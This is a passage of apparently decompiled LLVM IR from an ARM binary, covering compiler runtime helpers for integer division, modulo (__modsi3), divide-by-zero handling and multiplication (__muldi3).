  %v5_13cf8 = phi i32 [ %v1_13ce8, %bb74 ], [ %v3_13cf4, %.thread67 ], [ %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, %dec_label_pc_13d60 ], [ 0, %bb84 ], [ %v1_13d94, %dec_label_pc_13d90 ], [ %v2_13d90, %bb89 ]
  ret i32 %v5_13cf8

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_13d00.preheader
  %v0_13d14.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_13d00.preheader ], [ %v4_13d08, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13d00.preheader ], [ %v2_13d0c11, %.thread1.thread9 ]
  br label %dec_label_pc_13d14thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_13d00.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_13d0c11, %.thread1.thread9 ], [ 0, %dec_label_pc_13d00.preheader ]
  %v0_13d14.pr33100 = phi i32 [ %v4_13d08, %.thread1.thread9 ], [ %arg2, %dec_label_pc_13d00.preheader ]
  %v4_13d04 = icmp ult i32 %v0_13d14.pr33100, %v1_13ce8
  br i1 %v4_13d04, label %bb78, label %dec_label_pc_13d14thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_13d08 = and i32 %v0_13d14.pr33100, 268435456
  %v3_13d08 = icmp eq i32 %v2_13d08, 0
  %v4_13d08 = mul i32 %v0_13d14.pr33100, 16
  br i1 %v3_13d08, label %.thread1.thread9, label %dec_label_pc_13d14.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_13d0c11 = add i32 %storemerge101, 4
  %v2_13d00 = icmp ugt i32 %v4_13d08, 268435455
  br i1 %v2_13d00, label %.thread, label %bb77

dec_label_pc_13d14thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_13d14thread-pre-split.loopexit

dec_label_pc_13d14thread-pre-split.loopexit:      ; preds = %dec_label_pc_13d14thread-pre-split.loopexit.loopexit, %.thread
  %v0_13d14.pr3398 = phi i32 [ %v0_13d14.pr33.lcssa, %.thread ], [ %v0_13d14.pr33100, %dec_label_pc_13d14thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_13d14thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13d14thread-pre-split

dec_label_pc_13d14thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13d14thread-pre-split.loopexit
  %v1_13d2039 = phi i32 [ %storemerge95, %dec_label_pc_13d14thread-pre-split.loopexit ], [ %v2_13d20, %.thread4 ]
  %v0_13d14.pr = phi i32 [ %v0_13d14.pr3398, %dec_label_pc_13d14thread-pre-split.loopexit ], [ %v3_13d1c, %.thread4 ]
  br label %dec_label_pc_13d14

dec_label_pc_13d14.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13d14.loopexit, %dec_label_pc_13d14thread-pre-split
  %v0_13d28.pr = phi i32 [ %v1_13d2039, %dec_label_pc_13d14thread-pre-split ], [ %storemerge101, %dec_label_pc_13d14.loopexit ]
  %v1_13d1c = phi i32 [ %v0_13d14.pr, %dec_label_pc_13d14thread-pre-split ], [ %v4_13d08, %dec_label_pc_13d14.loopexit ]
  %v2_13d14 = icmp slt i32 %v1_13d1c, 0
  br i1 %v2_13d14, label %dec_label_pc_13d28, label %bb79

bb79:                                             ; preds = %dec_label_pc_13d14
  %v4_13d18 = icmp ult i32 %v1_13d1c, %v1_13ce8
  br i1 %v4_13d18, label %.thread4, label %dec_label_pc_13d28

.thread4:                                         ; preds = %bb79
  %v3_13d1c = mul i32 %v1_13d1c, 2
  %v2_13d20 = add i32 %v0_13d28.pr, 1
  br label %dec_label_pc_13d14thread-pre-split

dec_label_pc_13d28:                               ; preds = %bb79, %dec_label_pc_13d14
  %v2_13d28 = add i32 %v0_13d28.pr, -3
  %v5_13d2c = icmp slt i32 %v0_13d28.pr, 3
  br i1 %v5_13d2c, label %dec_label_pc_13d6c, label %dec_label_pc_13d30

dec_label_pc_13d30:                               ; preds = %dec_label_pc_13d28, %bb83
  %v6_13d58 = phi i32 [ %v0_13d60, %bb83 ], [ %v2_13d28, %dec_label_pc_13d28 ]
  %v1_13d34 = phi i32 [ %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, %bb83 ], [ %v1_13ce8, %dec_label_pc_13d28 ]
  %v3_13d5412 = phi i32 [ %v3_13d54, %bb83 ], [ %v1_13d1c, %dec_label_pc_13d28 ]
  %v3_13d30 = icmp ult i32 %v1_13d34, %v3_13d5412
  %v3_13d34 = select i1 %v3_13d30, i32 0, i32 %v3_13d5412
  %v1_13d3c = sub i32 %v1_13d34, %v3_13d34
  %v4_13d38 = udiv i32 %v3_13d5412, 2
  %v6_13d38 = icmp ult i32 %v1_13d3c, %v4_13d38
  %v6_13d3c = select i1 %v6_13d38, i32 0, i32 %v4_13d38
  %v1_13d3c.v6_13d3c = sub i32 %v1_13d3c, %v6_13d3c
  %.demorgan = and i1 %v3_13d30, %v6_13d38
  %v4_13d40 = udiv i32 %v3_13d5412, 4
  %v6_13d40 = icmp ult i32 %v1_13d3c.v6_13d3c, %v4_13d40
  %v6_13d44 = select i1 %v6_13d40, i32 0, i32 %v4_13d40
  %v1_13d3c.v6_13d3c.v6_13d44 = sub i32 %v1_13d3c.v6_13d3c, %v6_13d44
  %.demorgan71 = and i1 %.demorgan, %v6_13d40
  %v4_13d48 = udiv i32 %v3_13d5412, 8
  %v6_13d48 = icmp ult i32 %v1_13d3c.v6_13d3c.v6_13d44, %v4_13d48
  %v6_13d4c = select i1 %v6_13d48, i32 0, i32 %v4_13d48
  %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c = sub i32 %v1_13d3c.v6_13d3c.v6_13d44, %v6_13d4c
  %.demorgan72 = and i1 %.demorgan71, %v6_13d48
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_13d30
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_13d30, %bb80
  %v2_13d50 = add i32 %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, -1
  %v4_13d50 = sub i32 0, %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c
  %v5_13d50 = and i32 %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, %v4_13d50
  %v3_13d54 = udiv i32 %v3_13d5412, 16
  %v5_13d58 = icmp slt i32 %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, 1
  br i1 %v5_13d58, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_13d58 = add i32 %v6_13d58, -4
  %v9_13d58 = sub i32 3, %v6_13d58
  %v10_13d58 = and i32 %v9_13d58, %v6_13d58
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_13d60 = phi i32 [ %v6_13d58, %bb81 ], [ %v7_13d58, %bb82 ]
  %v0_13d5c15.in = phi i32 [ %v2_13d50, %bb81 ], [ %v7_13d58, %bb82 ]
  %v1_13d5c14.in = phi i32 [ %v5_13d50, %bb81 ], [ %v10_13d58, %bb82 ]
  %v1_13d5c14 = icmp slt i32 %v1_13d5c14.in, 0
  %v0_13d5c15 = icmp slt i32 %v0_13d5c15.in, 0
  %v2_13d5c = xor i1 %v0_13d5c15, %v1_13d5c14
  br i1 %v2_13d5c, label %dec_label_pc_13d60, label %dec_label_pc_13d30

dec_label_pc_13d60:                               ; preds = %bb83
  %v1_13d60 = urem i32 %v0_13d60, 4
  %v2_13d60 = icmp eq i32 %v1_13d60, 0
  br i1 %v2_13d60, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_13d60
  %v3_13d64 = icmp eq i32 %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, 0
  br i1 %v3_13d64, label %bb76, label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %bb84, %dec_label_pc_13d28
  %v0_13d80 = phi i32 [ %v3_13d54, %bb84 ], [ %v1_13d1c, %dec_label_pc_13d28 ]
  %v1_13d7c = phi i32 [ %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, %bb84 ], [ %v1_13ce8, %dec_label_pc_13d28 ]
  %v0_13d6c = phi i32 [ %v0_13d60, %bb84 ], [ %v2_13d28, %dec_label_pc_13d28 ]
  %v5_13d70 = icmp slt i32 %v0_13d6c, -2
  br i1 %v5_13d70, label %dec_label_pc_13d90, label %dec_label_pc_13d74

dec_label_pc_13d74:                               ; preds = %dec_label_pc_13d6c
  %v8_13d6c = icmp eq i32 %v0_13d6c, -2
  br i1 %v8_13d6c, label %dec_label_pc_13d84, label %dec_label_pc_13d78

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d74
  %v3_13d78 = icmp ult i32 %v1_13d7c, %v0_13d80
  br i1 %v3_13d78, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_13d78
  %v2_13d78 = sub i32 %v1_13d7c, %v0_13d80
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_13d78, %bb85
  %v0_13d8452 = phi i32 [ %v1_13d7c, %dec_label_pc_13d78 ], [ %v2_13d78, %bb85 ]
  %v3_13d80 = udiv i32 %v0_13d80, 2
  br label %dec_label_pc_13d84

dec_label_pc_13d84:                               ; preds = %dec_label_pc_13d74, %bb86
  %v0_13d8c = phi i32 [ %v0_13d80, %dec_label_pc_13d74 ], [ %v3_13d80, %bb86 ]
  %v1_13d88 = phi i32 [ %v1_13d7c, %dec_label_pc_13d74 ], [ %v0_13d8452, %bb86 ]
  %v3_13d84 = icmp ult i32 %v1_13d88, %v0_13d8c
  br i1 %v3_13d84, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_13d84
  %v2_13d84 = sub i32 %v1_13d88, %v0_13d8c
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_13d84, %bb87
  %v0_13d9055 = phi i32 [ %v1_13d88, %dec_label_pc_13d84 ], [ %v2_13d84, %bb87 ]
  %v3_13d8c = udiv i32 %v0_13d8c, 2
  br label %dec_label_pc_13d90

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d6c, %bb88
  %v2_13d94 = phi i32 [ %v0_13d80, %dec_label_pc_13d6c ], [ %v3_13d8c, %bb88 ]
  %v1_13d94 = phi i32 [ %v1_13d7c, %dec_label_pc_13d6c ], [ %v0_13d9055, %bb88 ]
  %v3_13d90 = icmp ult i32 %v1_13d94, %v2_13d94
  br i1 %v3_13d90, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_13d90
  %v2_13d90 = sub i32 %v1_13d94, %v2_13d94
  br label %bb76

dec_label_pc_13d9c:                               ; preds = %entry
  %v0_13d9c = load i32, i32* @lr, align 4
  %v0_13da0 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13d9c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13d94, { 1, 2, 0 }
  uselistorder i32 %v0_13d80, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13d60, { 1, 0, 2 }
  uselistorder i32 %v7_13d58, { 1, 0 }
  uselistorder i32 %v3_13d54, { 1, 0 }
  uselistorder i32 %v1_13d3c.v6_13d3c.v6_13d44.v6_13d4c, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_13d48, { 1, 0 }
  uselistorder i32 %v4_13d40, { 1, 0 }
  uselistorder i32 %v4_13d38, { 1, 0 }
  uselistorder i32 %v6_13d58, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13d28, { 1, 0 }
  uselistorder i32 %v1_13d1c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_13d08, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13d14.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13ce8, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_13d90, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_13d84, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_13d30, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_13dac = icmp eq i32 %arg2, 0
  br i1 %v2_13dac, label %dec_label_pc_13e80, label %dec_label_pc_13db4

dec_label_pc_13db4:                               ; preds = %entry
  %v1_13dac = icmp slt i32 %arg2, 0
  br i1 %v1_13dac, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_13db4
  %v2_13db4 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13db4, %bb
  %v4_13dcc = phi i32 [ %arg2, %dec_label_pc_13db4 ], [ %v2_13db4, %bb ]
  %v0_13db8 = load i32, i32* @r0, align 4
  %v1_13db8 = icmp slt i32 %v0_13db8, 0
  br i1 %v1_13db8, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_13dbc = sub i32 0, %v0_13db8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_13dc4 = phi i32 [ %v0_13db8, %bb79 ], [ %v2_13dbc, %bb80 ]
  %v1_13dc0 = add i32 %v4_13dcc, -1
  %v7_13dc0 = icmp eq i32 %v4_13dcc, 1
  br i1 %v7_13dc0, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_13dc4 = icmp eq i32 %v1_13dc4, %v4_13dcc
  br i1 %v10_13dc4, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_13dc4 = icmp ult i32 %v1_13dc4, %v4_13dcc
  br i1 %v4_13dc4, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_13dcc = and i32 %v1_13dc0, %v4_13dcc
  %v8_13dcc = icmp eq i32 %v6_13dcc, 0
  br i1 %v8_13dcc, label %.thread72, label %dec_label_pc_13ddc.preheader

dec_label_pc_13ddc.preheader:                     ; preds = %bb84
  %v2_13ddc109 = icmp ugt i32 %v4_13dcc, 268435455
  br i1 %v2_13ddc109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_13dd064 = phi i32 [ %v1_13dc4, %bb84 ], [ 0, %.thread70 ]
  %v3_13dd0 = and i32 %v1_13dd064, %v1_13dc0
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_13ddc.preheader
  %v0_13df0.pr35.lcssa = phi i32 [ %v4_13dcc, %dec_label_pc_13ddc.preheader ], [ %v4_13de4, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13ddc.preheader ], [ %v2_13de89, %.thread2.thread7 ]
  br label %dec_label_pc_13df0thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_13ddc.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_13de89, %.thread2.thread7 ], [ 0, %dec_label_pc_13ddc.preheader ]
  %v0_13df0.pr35110 = phi i32 [ %v4_13de4, %.thread2.thread7 ], [ %v4_13dcc, %dec_label_pc_13ddc.preheader ]
  %v4_13de0 = icmp ult i32 %v0_13df0.pr35110, %v1_13dc4
  br i1 %v4_13de0, label %bb86, label %dec_label_pc_13df0thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_13de4 = and i32 %v0_13df0.pr35110, 268435456
  %v3_13de4 = icmp eq i32 %v2_13de4, 0
  %v4_13de4 = mul i32 %v0_13df0.pr35110, 16
  br i1 %v3_13de4, label %.thread2.thread7, label %dec_label_pc_13df0.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_13de89 = add i32 %storemerge111, 4
  %v2_13ddc = icmp ugt i32 %v4_13de4, 268435455
  br i1 %v2_13ddc, label %.thread1, label %bb85

dec_label_pc_13df0thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_13df0thread-pre-split.loopexit

dec_label_pc_13df0thread-pre-split.loopexit:      ; preds = %dec_label_pc_13df0thread-pre-split.loopexit.loopexit, %.thread1
  %v0_13df0.pr35108 = phi i32 [ %v0_13df0.pr35.lcssa, %.thread1 ], [ %v0_13df0.pr35110, %dec_label_pc_13df0thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_13df0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13df0thread-pre-split

dec_label_pc_13df0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13df0thread-pre-split.loopexit
  %v1_13dfc41 = phi i32 [ %storemerge105, %dec_label_pc_13df0thread-pre-split.loopexit ], [ %v2_13dfc, %.thread4 ]
  %v2_13df436 = phi i32 [ %v1_13dc4, %dec_label_pc_13df0thread-pre-split.loopexit ], [ %v2_13df4, %.thread4 ]
  %v0_13df0.pr = phi i32 [ %v0_13df0.pr35108, %dec_label_pc_13df0thread-pre-split.loopexit ], [ %v3_13df8, %.thread4 ]
  br label %dec_label_pc_13df0

dec_label_pc_13df0.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13df0.loopexit, %dec_label_pc_13df0thread-pre-split
  %v0_13e04.pr = phi i32 [ %v1_13dfc41, %dec_label_pc_13df0thread-pre-split ], [ %storemerge111, %dec_label_pc_13df0.loopexit ]
  %v2_13df4 = phi i32 [ %v2_13df436, %dec_label_pc_13df0thread-pre-split ], [ %v1_13dc4, %dec_label_pc_13df0.loopexit ]
  %v1_13df8 = phi i32 [ %v0_13df0.pr, %dec_label_pc_13df0thread-pre-split ], [ %v4_13de4, %dec_label_pc_13df0.loopexit ]
  %v2_13df0 = icmp slt i32 %v1_13df8, 0
  br i1 %v2_13df0, label %dec_label_pc_13e04, label %bb87

bb87:                                             ; preds = %dec_label_pc_13df0
  %v4_13df4 = icmp ult i32 %v1_13df8, %v2_13df4
  br i1 %v4_13df4, label %.thread4, label %dec_label_pc_13e04

.thread4:                                         ; preds = %bb87
  %v3_13df8 = mul i32 %v1_13df8, 2
  %v2_13dfc = add i32 %v0_13e04.pr, 1
  br label %dec_label_pc_13df0thread-pre-split

dec_label_pc_13e04:                               ; preds = %bb87, %dec_label_pc_13df0
  %v2_13e04 = add i32 %v0_13e04.pr, -3
  %v5_13e08 = icmp slt i32 %v0_13e04.pr, 3
  br i1 %v5_13e08, label %dec_label_pc_13e48, label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13e04, %bb91
  %v6_13e34 = phi i32 [ %v0_13e3c, %bb91 ], [ %v2_13e04, %dec_label_pc_13e04 ]
  %v1_13e10 = phi i32 [ %v1_13e18.v6_13e18.v6_13e20.v6_13e28, %bb91 ], [ %v2_13df4, %dec_label_pc_13e04 ]
  %v3_13e3010 = phi i32 [ %v3_13e30, %bb91 ], [ %v1_13df8, %dec_label_pc_13e04 ]
  %v3_13e0c = icmp ult i32 %v1_13e10, %v3_13e3010
  %v3_13e10 = select i1 %v3_13e0c, i32 0, i32 %v3_13e3010
  %v1_13e18 = sub i32 %v1_13e10, %v3_13e10
  %v4_13e14 = udiv i32 %v3_13e3010, 2
  %v6_13e14 = icmp ult i32 %v1_13e18, %v4_13e14
  %v6_13e18 = select i1 %v6_13e14, i32 0, i32 %v4_13e14
  %v1_13e18.v6_13e18 = sub i32 %v1_13e18, %v6_13e18
  %.demorgan = and i1 %v3_13e0c, %v6_13e14
  %v4_13e1c = udiv i32 %v3_13e3010, 4
  %v6_13e1c = icmp ult i32 %v1_13e18.v6_13e18, %v4_13e1c
  %v6_13e20 = select i1 %v6_13e1c, i32 0, i32 %v4_13e1c
  %v1_13e18.v6_13e18.v6_13e20 = sub i32 %v1_13e18.v6_13e18, %v6_13e20
  %.demorgan76 = and i1 %.demorgan, %v6_13e1c
  %v4_13e24 = udiv i32 %v3_13e3010, 8
  %v6_13e24 = icmp ult i32 %v1_13e18.v6_13e18.v6_13e20, %v4_13e24
  %v6_13e28 = select i1 %v6_13e24, i32 0, i32 %v4_13e24
  %v1_13e18.v6_13e18.v6_13e20.v6_13e28 = sub i32 %v1_13e18.v6_13e18.v6_13e20, %v6_13e28
  %.demorgan77 = and i1 %.demorgan76, %v6_13e24
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_13e0c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_13e0c, %bb88
  %v2_13e2c = add i32 %v1_13e18.v6_13e18.v6_13e20.v6_13e28, -1
  %v4_13e2c = sub i32 0, %v1_13e18.v6_13e18.v6_13e20.v6_13e28
  %v5_13e2c = and i32 %v1_13e18.v6_13e18.v6_13e20.v6_13e28, %v4_13e2c
  %v3_13e30 = udiv i32 %v3_13e3010, 16
  %v5_13e34 = icmp slt i32 %v1_13e18.v6_13e18.v6_13e20.v6_13e28, 1
  br i1 %v5_13e34, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_13e34 = add i32 %v6_13e34, -4
  %v9_13e34 = sub i32 3, %v6_13e34
  %v10_13e34 = and i32 %v9_13e34, %v6_13e34
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_13e3c = phi i32 [ %v6_13e34, %bb89 ], [ %v7_13e34, %bb90 ]
  %v0_13e3813.in = phi i32 [ %v2_13e2c, %bb89 ], [ %v7_13e34, %bb90 ]
  %v1_13e3812.in = phi i32 [ %v5_13e2c, %bb89 ], [ %v10_13e34, %bb90 ]
  %v1_13e3812 = icmp slt i32 %v1_13e3812.in, 0
  %v0_13e3813 = icmp slt i32 %v0_13e3813.in, 0
  %v2_13e38 = xor i1 %v0_13e3813, %v1_13e3812
  br i1 %v2_13e38, label %dec_label_pc_13e3c, label %dec_label_pc_13e0c

dec_label_pc_13e3c:                               ; preds = %bb91
  %v1_13e3c = urem i32 %v0_13e3c, 4
  %v2_13e3c = icmp eq i32 %v1_13e3c, 0
  br i1 %v2_13e3c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_13e3c
  %v3_13e40 = icmp eq i32 %v1_13e18.v6_13e18.v6_13e20.v6_13e28, 0
  br i1 %v3_13e40, label %.thread6, label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %bb92, %dec_label_pc_13e04
  %v0_13e5c = phi i32 [ %v3_13e30, %bb92 ], [ %v1_13df8, %dec_label_pc_13e04 ]
  %v1_13e58 = phi i32 [ %v1_13e18.v6_13e18.v6_13e20.v6_13e28, %bb92 ], [ %v2_13df4, %dec_label_pc_13e04 ]
  %v0_13e48 = phi i32 [ %v0_13e3c, %bb92 ], [ %v2_13e04, %dec_label_pc_13e04 ]
  %v5_13e4c = icmp slt i32 %v0_13e48, -2
  br i1 %v5_13e4c, label %dec_label_pc_13e6c, label %dec_label_pc_13e50

dec_label_pc_13e50:                               ; preds = %dec_label_pc_13e48
  %v8_13e48 = icmp eq i32 %v0_13e48, -2
  br i1 %v8_13e48, label %dec_label_pc_13e60, label %dec_label_pc_13e54

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e50
  %v3_13e54 = icmp ult i32 %v1_13e58, %v0_13e5c
  br i1 %v3_13e54, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_13e54
  %v2_13e54 = sub i32 %v1_13e58, %v0_13e5c
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_13e54, %bb93
  %v0_13e6054 = phi i32 [ %v1_13e58, %dec_label_pc_13e54 ], [ %v2_13e54, %bb93 ]
  %v3_13e5c = udiv i32 %v0_13e5c, 2
  br label %dec_label_pc_13e60

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e50, %bb94
  %v0_13e68 = phi i32 [ %v0_13e5c, %dec_label_pc_13e50 ], [ %v3_13e5c, %bb94 ]
  %v1_13e64 = phi i32 [ %v1_13e58, %dec_label_pc_13e50 ], [ %v0_13e6054, %bb94 ]
  %v3_13e60 = icmp ult i32 %v1_13e64, %v0_13e68
  br i1 %v3_13e60, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_13e60
  %v2_13e60 = sub i32 %v1_13e64, %v0_13e68
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_13e60, %bb95
  %v0_13e6c57 = phi i32 [ %v1_13e64, %dec_label_pc_13e60 ], [ %v2_13e60, %bb95 ]
  %v3_13e68 = udiv i32 %v0_13e68, 2
  br label %dec_label_pc_13e6c

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e48, %bb96
  %v2_13e70 = phi i32 [ %v0_13e5c, %dec_label_pc_13e48 ], [ %v3_13e68, %bb96 ]
  %v1_13e70 = phi i32 [ %v1_13e58, %dec_label_pc_13e48 ], [ %v0_13e6c57, %bb96 ]
  %v3_13e6c = icmp ult i32 %v1_13e70, %v2_13e70
  br i1 %v3_13e6c, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_13e6c
  %v2_13e6c = sub i32 %v1_13e70, %v2_13e70
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13e6c, %bb83, %.thread72, %dec_label_pc_13e3c, %bb92, %bb97
  %v1_13e78 = phi i32 [ %v1_13e18.v6_13e18.v6_13e20.v6_13e28, %dec_label_pc_13e3c ], [ 0, %bb92 ], [ %v1_13e70, %dec_label_pc_13e6c ], [ %v2_13e6c, %bb97 ], [ %v3_13dd0, %.thread72 ], [ %v1_13dc4, %bb83 ]
  br i1 %v1_13db8, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_13e78 = sub i32 0, %v1_13e78
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_13e7c = phi i32 [ %v1_13e78, %.thread6 ], [ %v2_13e78, %bb98 ]
  ret i32 %v1_13e7c

dec_label_pc_13e80:                               ; preds = %entry
  %v0_13e80 = load i32, i32* @lr, align 4
  %v0_13e84 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13e80)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_13e5c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13e3c, { 1, 0, 2 }
  uselistorder i32 %v7_13e34, { 1, 0 }
  uselistorder i32 %v3_13e30, { 1, 0 }
  uselistorder i32 %v1_13e18.v6_13e18.v6_13e20.v6_13e28, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_13e24, { 1, 0 }
  uselistorder i32 %v4_13e1c, { 1, 0 }
  uselistorder i32 %v4_13e14, { 1, 0 }
  uselistorder i32 %v6_13e34, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13e04, { 1, 0 }
  uselistorder i32 %v1_13df8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_13df4, { 1, 0, 3, 2 }
  uselistorder i32 %v4_13de4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13df0.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13dc4, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_13dcc, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_13e6c, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13e60, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_13e0c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_13e90 = load i32, i32* @r0, align 4
  ret i32 %v1_13e90
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_13ea0 = udiv i32 %arg1, 65536
  %v3_13ea4 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_13ea0, -65536
  %v5_13ea8 = add i32 %tmp, -1
  %v6_13ea8 = and i32 %v5_13ea8, %arg1
  %tmp10 = mul i32 %v3_13ea4, -65536
  %v5_13eac = add i32 %tmp10, -1
  %v6_13eac = and i32 %v5_13eac, %arg3
  %v2_13eb0 = mul i32 %v6_13eac, %v6_13ea8
  %v2_13eb4 = mul i32 %v6_13eac, %v3_13ea0
  %v2_13eb8 = mul i32 %v6_13ea8, %v3_13ea4
  %v2_13ec0 = add i32 %v2_13eb4, %v2_13eb8
  %v3_13ec0 = icmp ult i32 %v2_13ec0, %v2_13eb4
  br i1 %v3_13ec0, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_13ec8 = mul i32 %v2_13ec0, 65536
  %v5_13ec8 = add i32 %v4_13ec8, %v2_13eb0
  ret i32 %v5_13ec8

; uselistorder directives
  uselistorder i32 %v2_13eb4, { 1, 0 }
  uselistorder i32 %v6_13ea8, { 1, 0 }
  uselistorder i32 %v3_13ea4, { 1, 0 }
  uselistorder i32 %v3_13ea0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
